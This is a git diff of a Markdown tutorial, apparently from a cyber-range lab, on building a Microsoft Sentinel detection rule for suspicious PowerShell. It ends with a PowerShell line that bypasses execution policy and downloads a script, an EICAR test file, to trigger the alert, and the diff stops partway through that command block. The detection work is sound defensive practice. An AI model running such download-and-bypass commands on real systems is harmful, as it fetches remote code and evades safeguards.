@@ -90,16 +90,16 @@ DeviceProcessEvents
 4. **Entity Mapping**:
 
    * `AccountName`, `DeviceName`, `ProcessCommandLine`
-5. **MITRE Tactic**: Credential Access / Execution
+5. **MITRE Tactic**: Command and Scripting Interpreter: PowerShell / Execution
 6. **Enable** and save the rule
 
-![Sentinel Screenshot](https://github.com/user-attachments/assets/76cacb6f-3ce3-4d2a-b76b-ee8bbc5164da)
+![Sentinel Screenshot](https://github.com/user-attachments/assets/2c2e0d75-aa67-4ffc-a5ed-ffe30393d388)
 
 ---
 
 ### 💣 Simulate Attack — Triggering the Alert
 
-In order to generate log activity that will trigger an Incident in Sentinel, I executed the following PowerShell command on the onboarded VM (`PVR-HUNTING2`) to simulate the attack:
+In order to generate log activity that will trigger an Incident in Sentinel, I executed the following PowerShell command on the onboarded VM (`nessa-windows`) to simulate the attack:
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
